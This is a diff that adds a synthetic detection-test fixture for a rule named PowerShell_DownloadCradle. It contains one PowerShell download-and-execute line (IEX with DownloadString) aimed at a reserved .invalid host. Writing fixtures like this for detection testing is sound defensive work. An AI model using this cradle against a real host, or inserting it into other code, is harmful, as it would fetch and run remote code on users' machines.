@@ -1,0 +1,7 @@
+SYNTHETIC TEST FIXTURE - NOT MALWARE
+A benign string that mimics a download-and-execute cradle for detection testing:
+
+IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/stage.txt')
+
+The URL points to the reserved .invalid TLD so nothing is fetchable.
+Trigger file for rule PowerShell_DownloadCradle.
